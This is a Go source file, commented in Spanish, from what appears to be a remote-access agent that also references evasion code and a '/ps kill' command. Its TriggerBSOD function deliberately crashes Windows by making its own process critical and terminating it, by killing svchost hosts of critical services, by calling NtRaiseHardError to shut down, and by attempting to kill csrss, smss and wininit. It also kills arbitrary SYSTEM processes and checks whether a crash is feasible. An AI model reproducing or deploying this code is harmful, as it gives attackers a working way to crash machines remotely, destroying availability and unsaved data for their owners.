//go:build windows

package win32

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Un bugcheck desde user mode tiene tres caminos y solo uno es fiable en
// Windows moderno.
//
// Matar csrss, smss o wininit ya no sirve: desde Vista corren como procesos
// protegidos (PPL, firmante WinTcb-Light). Con SeDebugPrivilege activo el
// handle de terminación se sigue denegando con ACCESS_DENIED, sin bandera que
// lo evite. Por eso el error que veía el operador era "wininit.exe (pid 884):
// Access is denied".
//
// Lo que sí funciona es terminar un svchost que Windows marca como crítico
// (RpcSs y compañía). svchost no es PPL, así que el handle se abre; el proceso
// lleva BreakOnTermination, así que el kernel responde con
// CRITICAL_PROCESS_DIED (0xEF), que es el bugcheck pedido.
//
// El tercer camino, NtRaiseHardError con ResponseOptionShutdown, no toca otro
// proceso pero exige SeShutdownPrivilege activo en el token. Sin activarlo
// devuelve STATUS_PRIVILEGE_NOT_HELD (0xC0000061), que era el otro error del
// informe. Se queda como respaldo porque produce 0xC0000420, no 0xEF.

var (
	procNtRaiseHardError        = ntdll.NewProc("NtRaiseHardError")
	procNtSetInformationProcess = ntdll.NewProc("NtSetInformationProcess")
	procRtlAdjustPrivilege      = ntdll.NewProc("RtlAdjustPrivilege")
	procAdjustTokenPrivileges   = advapi32.NewProc("AdjustTokenPrivileges")
	procIsProcessCritical       = kernel32.NewProc("IsProcessCritical")
)

// ProcessBreakOnTermination: la clase de NtSetInformationProcess que pone la
// bandera BreakOnTermination. Es la misma que usa RtlSetProcessIsCritical.
const processBreakOnTermination = 29

// bsodTrace recibe cada paso del disparo. El agente lo engancha al diario y el
// probe a un archivo con Sync: cuando la máquina cae a mitad de la llamada, la
// última línea escrita es el paso que la tumbó, porque el proceso que provoca
// el bugcheck no puede informar de su propio resultado.
var bsodTrace = func(string) {}

// SetBSODTrace instala el receptor de trazas. Pasar nil lo deja mudo.
func SetBSODTrace(fn func(string)) {
	if fn == nil {
		bsodTrace = func(string) {}
		return
	}
	bsodTrace = fn
}

// criticalProcesses son los procesos cuya muerte provocaba bugcheck en Windows
// sin PPL. Hoy están protegidos; se listan para el respaldo final.
var criticalProcesses = []string{
	"csrss.exe",   // subsistema de cliente
	"smss.exe",    // gestor de sesiones
	"wininit.exe", // inicio de sesión 0
}

// criticalServices son servicios que Windows marca como críticos. El SCM da el
// PID del svchost que los hospeda, y ese proceso no está protegido por PPL.
var criticalServices = []string{
	"RpcSs",
	"RpcEptMapper",
	"Power",
	"PlugPlay",
	"SystemEventsBroker",
	"BrokerInfrastructure",
	"LSM",
}

const (
	// STATUS_ASSERTION_FAILURE: el kernel lo trata como fatal y hace bugcheck
	// con este mismo código.
	statusAssertionFailure = 0xC0000420

	// ResponseOptionShutdown hace que el error duro apague el equipo en vez de
	// quedarse esperando un clic que nadie va a dar.
	responseOptionShutdown = 6

	// SE_SHUTDOWN_PRIVILEGE en el orden fijo de ntdll.
	seShutdownPrivilege = 19

	// criticalExitWait es lo que se espera tras terminar un proceso crítico.
	// Si el proceso lo era, el kernel hace bugcheck en milisegundos y esta
	// espera no llega a terminar.
	criticalExitWait = 1500 * time.Millisecond
)

// serviceHost es el proceso que hospeda un servicio del SCM.
type serviceHost struct {
	service string
	pid     uint32
}

// TriggerBSOD provoca el bugcheck y devuelve el método que lo consiguió. La
// llamada vuelve antes de que la máquina caiga: Windows tarda milisegundos.
func TriggerBSOD() (string, error) {
	bsodTrace("privilegio: activando SeDebugPrivilege")
	if err := enablePrivilege("SeDebugPrivilege"); err != nil {
		bsodTrace("privilegio: " + err.Error())
	}

	// El aviso en disco es lo que permite confirmar el resultado después del
	// reinicio: el proceso que provoca el bugcheck no puede informar él mismo.
	_ = MarkPendingBugcheck("proceso crítico → CRITICAL_PROCESS_DIED (0xEF)")

	var problems []string

	// 1. El propio proceso se marca crítico y se termina. Es el camino más
	// corto al kernel y el único que no depende de terceros: no le importa qué
	// servicio hospeda cada svchost, ni si Windows lo tiene protegido, ni si el
	// SCM lo reinicia. El kernel ve salir un proceso con BreakOnTermination y
	// responde con 0xEF en el mismo instante.
	bsodTrace("autocrítico: marcando el proceso como crítico")
	if err := killSelfAsCritical(); err != nil {
		problems = append(problems, "autocrítico: "+err.Error())
		bsodTrace("autocrítico: " + err.Error())
	}

	// 2. svchost que hospeda un servicio crítico.
	bsodTrace("svchost: buscando proceso crítico")
	if err := killCriticalHosts(); err != nil {
		problems = append(problems, "proceso crítico: "+err.Error())
		bsodTrace("svchost: " + err.Error())
	}

	// 3. Error duro con apagado. No pinta la pantalla azul: apaga el equipo de
	// inmediato, que es lo que queda cuando los dos caminos anteriores fallan.
	bsodTrace("NtRaiseHardError: disparando")
	if err := raiseHardError(); err == nil {
		return "NtRaiseHardError (0xC0000420)", nil
	} else {
		problems = append(problems, "NtRaiseHardError: "+err.Error())
		bsodTrace("NtRaiseHardError: " + err.Error())
	}

	// 4. Respaldo para sistemas sin PPL.
	for _, name := range criticalProcesses {
		pids, err := pidsByName(name)
		if err != nil || len(pids) == 0 {
			continue
		}
		for _, pid := range pids {
			if err := killProcess(pid); err != nil {
				problems = append(problems, fmt.Sprintf("%s (pid %d): %v", name, pid, err))
				continue
			}
			return fmt.Sprintf("%s (pid %d)", name, pid), nil
		}
	}

	// Nada se terminó: no hubo bugcheck y el aviso no debe sobrevivir.
	_ = ClearPendingBugcheck()
	return "", errors.New(strings.Join(problems, "; "))
}

// killSelfAsCritical pone BreakOnTermination en este proceso y lo termina.
//
// Es el camino más fiable a un bugcheck real desde user mode: el kernel no
// consulta firmas ni protecciones, solo ve salir un proceso crítico y responde
// con CRITICAL_PROCESS_DIED (0xEF). Necesita SeDebugPrivilege, que el llamador
// ya activó.
//
// Si TerminateProcess vuelve, la bandera no surtió efecto y se revierte: dejar
// el agente marcado como crítico haría que cualquier muerte suya —un taskkill,
// un antivirus, el watchdog— reiniciara la máquina sin avisar.
func killSelfAsCritical() error {
	previous, err := setProcessCritical(true)
	if err != nil {
		return err
	}
	bsodTrace(fmt.Sprintf("autocrítico: BreakOnTermination activo (antes=%v)", previous))

	if err := windows.TerminateProcess(windows.CurrentProcess(), 1); err != nil {
		if _, revertErr := setProcessCritical(previous); revertErr != nil {
			bsodTrace("autocrítico: NO se pudo revertir BreakOnTermination: " + revertErr.Error())
		}
		return fmt.Errorf("TerminateProcess: %w", err)
	}

	// Si TerminateProcess vuelve, el kernel no trató el proceso como crítico.
	// Se revierte para no dejar al agente marcado: un proceso con
	// BreakOnTermination que muera por cualquier otra causa —un taskkill, el
	// watchdog, un antivirus— reiniciaría la máquina sin que nadie lo pida.
	if _, revertErr := setProcessCritical(previous); revertErr != nil {
		bsodTrace("autocrítico: NO se pudo revertir BreakOnTermination: " + revertErr.Error())
	}
	return errors.New("el kernel no aplicó BreakOnTermination")
}

// setProcessCritical escribe BreakOnTermination en el proceso actual y devuelve
// el valor que tenía antes.
func setProcessCritical(critical bool) (previous bool, err error) {
	if err := procNtSetInformationProcess.Find(); err != nil {
		return false, fmt.Errorf("NtSetInformationProcess: %w", err)
	}
	if flag, known := isProcessCritical(windows.CurrentProcess()); known {
		previous = flag
	}

	value := int32(0)
	if critical {
		value = 1
	}
	status, _, _ := procNtSetInformationProcess.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(processBreakOnTermination),
		uintptr(unsafe.Pointer(&value)),
		unsafe.Sizeof(value))
	if status != 0 {
		return previous, fmt.Errorf("NtSetInformationProcess(29): 0x%X", uint32(status))
	}
	return previous, nil
}

// criticalServiceHosts pregunta al SCM qué proceso hospeda cada servicio
// crítico. Los servicios comparten svchost, así que se deduplica por PID.
func criticalServiceHosts() ([]serviceHost, error) {
	manager, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CONNECT)
	if err != nil {
		return nil, fmt.Errorf("SCM: %w", err)
	}
	defer func() { _ = windows.CloseServiceHandle(manager) }()

	var hosts []serviceHost
	seen := make(map[uint32]bool)
	var lastErr error

	for _, name := range criticalServices {
		ptr, err := windows.UTF16PtrFromString(name)
		if err != nil {
			continue
		}
		service, err := windows.OpenService(manager, ptr, windows.SERVICE_QUERY_STATUS)
		if err != nil {
			lastErr = fmt.Errorf("%s: %w", name, err)
			continue
		}

		var status windows.SERVICE_STATUS_PROCESS
		var needed uint32
		err = windows.QueryServiceStatusEx(service, windows.SC_STATUS_PROCESS_INFO,
			(*byte)(unsafe.Pointer(&status)), uint32(unsafe.Sizeof(status)), &needed)
		_ = windows.CloseServiceHandle(service)
		if err != nil {
			lastErr = fmt.Errorf("%s: %w", name, err)
			continue
		}
		if status.ProcessId == 0 || seen[status.ProcessId] {
			continue
		}
		seen[status.ProcessId] = true
		hosts = append(hosts, serviceHost{service: name, pid: status.ProcessId})
	}

	if len(hosts) == 0 {
		if lastErr != nil {
			return nil, lastErr
		}
		return nil, errors.New("ningún servicio crítico en ejecución")
	}
	return hosts, nil
}

// killCriticalHosts termina el primer svchost crítico que acepte el handle.
// Nunca vuelve si el bugcheck sale: la espera posterior queda a medias porque
// la máquina ya está cayendo.
func killCriticalHosts() error {
	hosts, err := criticalServiceHosts()
	if err != nil {
		return err
	}

	var last error
	for _, host := range hosts {
		handle, err := windows.OpenProcess(
			windows.PROCESS_QUERY_LIMITED_INFORMATION|windows.PROCESS_TERMINATE, false, host.pid)
		if err != nil {
			last = fmt.Errorf("%s (pid %d): %w", host.service, host.pid, err)
			continue
		}

		critical, known := isProcessCritical(handle)
		if known && !critical {
			_ = windows.CloseHandle(handle)
			last = fmt.Errorf("%s (pid %d) no lleva BreakOnTermination", host.service, host.pid)
			continue
		}

		err = windows.TerminateProcess(handle, 1)
		_ = windows.CloseHandle(handle)
		if err != nil {
			last = fmt.Errorf("%s (pid %d): %w", host.service, host.pid, err)
			continue
		}

		// Proceso crítico: el kernel hace bugcheck ahora y esta espera no
		// termina. Si termina, el kernel sigue en pie y se prueba el siguiente.
		time.Sleep(criticalExitWait)
		last = fmt.Errorf("%s (pid %d) terminado sin bugcheck", host.service, host.pid)
	}

	if last == nil {
		last = errors.New("no hay procesos críticos accesibles")
	}
	return last
}

// isProcessCritical pregunta al kernel si el proceso lleva BreakOnTermination.
// Devuelve known=false si la API no existe (antes de Windows 8.1).
func isProcessCritical(handle windows.Handle) (critical, known bool) {
	if err := procIsProcessCritical.Find(); err != nil {
		return false, false
	}
	var flag int32
	result, _, _ := procIsProcessCritical.Call(uintptr(handle), uintptr(unsafe.Pointer(&flag)))
	if result == 0 {
		return false, false
	}
	return flag != 0, true
}

// raiseHardError lanza un error duro fatal con apagado. No abre el handle de
// nadie: solo llama a ntdll con SeShutdownPrivilege activo de verdad.
func raiseHardError() error {
	if err := enablePrivilege("SeShutdownPrivilege"); err != nil {
		return err
	}
	present, enabled, err := privilegeState("SeShutdownPrivilege")
	if err != nil {
		return err
	}
	if !present {
		return errors.New("el token no tiene SeShutdownPrivilege")
	}
	if !enabled {
		return errors.New("SeShutdownPrivilege no quedó activo")
	}

	// RtlAdjustPrivilege trabaja sobre el token efectivo del hilo, que es el
	// que mira el kernel. Es un refuerzo, no un requisito: el privilegio ya
	// está activo en el token del proceso y comprobado arriba, así que un
	// fallo aquí no debe impedir la llamada.
	var previous uint32
	procRtlAdjustPrivilege.Call(
		uintptr(seShutdownPrivilege), 1, 0, uintptr(unsafe.Pointer(&previous)))

	var response uint32
	status, _, _ := procNtRaiseHardError.Call(
		uintptr(statusAssertionFailure),
		0, 0, 0,
		uintptr(responseOptionShutdown),
		uintptr(unsafe.Pointer(&response)))
	if status != 0 {
		return fmt.Errorf("ntdll devolvió 0x%X", uint32(status))
	}
	return nil
}

// enablePrivilege activa un privilegio del token actual. AdjustTokenPrivileges
// no falla cuando el privilegio no existe en el token: devuelve éxito y deja
// ERROR_NOT_ALL_ASSIGNED en el último error. Sin comprobar el estado después,
// el código cree que activó algo que nunca tuvo.
func enablePrivilege(name string) error {
	var token windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(),
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token); err != nil {
		return err
	}
	defer func() { _ = token.Close() }()

	var luid windows.LUID
	ptr, err := windows.UTF16PtrFromString(name)
	if err != nil {
		return err
	}
	if err := windows.LookupPrivilegeValue(nil, ptr, &luid); err != nil {
		return err
	}

	state := windows.Tokenprivileges{PrivilegeCount: 1}
	state.Privileges[0].Luid = luid
	state.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED

	result, _, callErr := procAdjustTokenPrivileges.Call(
		uintptr(token), 0, uintptr(unsafe.Pointer(&state)), 0, 0, 0)
	if result == 0 {
		if callErr == nil {
			return fmt.Errorf("%s: AdjustTokenPrivileges falló sin código", name)
		}
		return fmt.Errorf("%s: %w", name, callErr)
	}
	if callErr == windows.ERROR_NOT_ALL_ASSIGNED {
		return fmt.Errorf("el token no tiene %s", name)
	}

	present, enabled, err := privilegeState(name)
	if err != nil {
		return err
	}
	if !present {
		return fmt.Errorf("el token no tiene %s", name)
	}
	if !enabled {
		return fmt.Errorf("%s no quedó activo", name)
	}
	return nil
}

// privilegeState dice si el privilegio existe en el token y si está activo.
// Es la única prueba fiable: AdjustTokenPrivileges puede devolver éxito sin
// haber activado nada.
func privilegeState(name string) (present, enabled bool, err error) {
	var token windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token); err != nil {
		return false, false, err
	}
	defer func() { _ = token.Close() }()

	var luid windows.LUID
	ptr, err := windows.UTF16PtrFromString(name)
	if err != nil {
		return false, false, err
	}
	if err := windows.LookupPrivilegeValue(nil, ptr, &luid); err != nil {
		return false, false, err
	}

	var size uint32
	_ = windows.GetTokenInformation(token, windows.TokenPrivileges, nil, 0, &size)
	if size == 0 {
		return false, false, errors.New("token sin información de privilegios")
	}
	buf := make([]byte, size)
	if err := windows.GetTokenInformation(token, windows.TokenPrivileges, &buf[0], size, &size); err != nil {
		return false, false, err
	}

	privileges := (*windows.Tokenprivileges)(unsafe.Pointer(&buf[0]))
	for _, entry := range privileges.AllPrivileges() {
		if entry.Luid == luid {
			return true, entry.Attributes&windows.SE_PRIVILEGE_ENABLED != 0, nil
		}
	}
	return false, false, nil
}

// pidsByName devuelve todos los procesos con ese nombre de ejecutable.
func pidsByName(name string) ([]uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, err
	}
	defer func() {
		if cerr := windows.CloseHandle(snapshot); cerr != nil {
			_ = cerr
		}
	}()

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	if err := windows.Process32First(snapshot, &entry); err != nil {
		return nil, err
	}

	var out []uint32
	for {
		if entry.ProcessID != 0 && equalFoldUTF16(entry.ExeFile[:], name) {
			out = append(out, entry.ProcessID)
		}
		if err := windows.Process32Next(snapshot, &entry); err != nil {
			break
		}
	}
	return out, nil
}

// equalFoldUTF16 compara el nombre del proceso sin distinguir mayúsculas.
func equalFoldUTF16(raw []uint16, want string) bool {
	got := windows.UTF16ToString(raw)
	if len(got) != len(want) {
		return false
	}
	for index := 0; index < len(got); index++ {
		left := got[index]
		right := want[index]
		if left >= 'A' && left <= 'Z' {
			left += 'a' - 'A'
		}
		if right >= 'A' && right <= 'Z' {
			right += 'a' - 'A'
		}
		if left != right {
			return false
		}
	}
	return true
}

// killProcess pide la terminación y devuelve el error, a diferencia del
// terminateProcess de evasion.go que solo intenta y sigue.
func killProcess(pid uint32) error {
	handle, err := windows.OpenProcess(
		windows.PROCESS_TERMINATE|windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return err
	}
	defer func() {
		if cerr := windows.CloseHandle(handle); cerr != nil {
			_ = cerr
		}
	}()

	if err := windows.TerminateProcess(handle, 1); err != nil {
		return err
	}
	return nil
}

// TerminatePID mata un proceso cualquiera con los privilegios ya activados.
// Lo usa /ps kill para que matar un proceso de SYSTEM no falle por token.
func TerminatePID(pid uint32) error {
	_ = enablePrivilege("SeDebugPrivilege")
	if pid == 0 {
		return errors.New("pid 0 no es un proceso")
	}
	return killProcess(pid)
}

// BSODDiagnostics informa, desde el proceso que llama, si el bugcheck puede
// ejecutarse. No termina nada: solo activa privilegios, abre handles y los
// cierra. Es la comprobación que vale, porque corre con el token real del
// agente y no con el de un test aparte.
func BSODDiagnostics() string {
	var report strings.Builder

	exe, err := os.Executable()
	if err != nil {
		exe = os.Args[0]
	}
	fmt.Fprintf(&report, "proceso    : %s (pid %d)\n", filepath.Base(exe), os.Getpid())

	var token windows.Token
	identity := "sin token"
	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token); err == nil {
		identity = integrityLevel(token)
		if token.IsElevated() {
			identity += ", elevado"
		} else {
			identity += ", sin elevar"
		}
		_ = token.Close()
	}
	fmt.Fprintf(&report, "token      : %s\n", identity)

	for _, name := range []string{"SeDebugPrivilege", "SeShutdownPrivilege"} {
		short := strings.TrimSuffix(name, "Privilege")
		present, enabled, err := privilegeState(name)
		if err != nil {
			fmt.Fprintf(&report, "%-10s : %v\n", short, err)
			continue
		}
		note := ""
		if !enabled {
			if err := enablePrivilege(name); err != nil {
				note = " -> " + err.Error()
			} else {
				note = " -> activo"
			}
		}
		fmt.Fprintf(&report, "%-10s : presente=%v activo=%v%s\n", short, present, enabled, note)
	}

	hosts, err := criticalServiceHosts()
	if err != nil {
		fmt.Fprintf(&report, "SCM        : %v\n", err)
		report.WriteString("veredicto  : SIN bugcheck\n")
		return report.String()
	}
	fmt.Fprintf(&report, "SCM        : %d procesos críticos\n", len(hosts))

	ready := 0
	for _, host := range hosts {
		handle, err := windows.OpenProcess(
			windows.PROCESS_QUERY_LIMITED_INFORMATION|windows.PROCESS_TERMINATE, false, host.pid)
		if err != nil {
			fmt.Fprintf(&report, "  %-20s pid %-6d TERMINATE denegado: %v\n", host.service, host.pid, err)
			continue
		}
		critical, known := isProcessCritical(handle)
		_ = windows.CloseHandle(handle)
		if !known {
			fmt.Fprintf(&report, "  %-20s pid %-6d crítico=desconocido TERMINATE concedido\n", host.service, host.pid)
			ready++
			continue
		}
		fmt.Fprintf(&report, "  %-20s pid %-6d crítico=%v TERMINATE concedido\n", host.service, host.pid, critical)
		if critical {
			ready++
		}
	}

	if ready > 0 {
		report.WriteString("veredicto  : listo para CRITICAL_PROCESS_DIED (0xEF)\n")
	} else {
		report.WriteString("veredicto  : sin proceso crítico terminable\n")
	}
	return report.String()
}

// integrityLevel traduce el RID del SID obligatorio a la etiqueta que usa
// Windows. Los valores son fijos y no dependen del idioma del sistema.
func integrityLevel(token windows.Token) string {
	var size uint32
	_ = windows.GetTokenInformation(token, windows.TokenIntegrityLevel, nil, 0, &size)
	if size == 0 {
		return "integridad desconocida"
	}
	buf := make([]byte, size)
	if err := windows.GetTokenInformation(token, windows.TokenIntegrityLevel, &buf[0], size, &size); err != nil {
		return "integridad desconocida"
	}

	label := (*windows.Tokenmandatorylabel)(unsafe.Pointer(&buf[0]))
	sid := label.Label.Sid
	if sid == nil {
		return "integridad desconocida"
	}
	count := sid.SubAuthorityCount()
	if count == 0 {
		return "integridad desconocida"
	}

	switch rid := sid.SubAuthority(uint32(count) - 1); {
	case rid >= 0x4000:
		return "integridad System"
	case rid >= 0x3000:
		return "integridad Alta"
	case rid >= 0x2000:
		return "integridad Media"
	case rid >= 0x1000:
		return "integridad Baja"
	default:
		return "integridad Sin privilegios"
	}
}
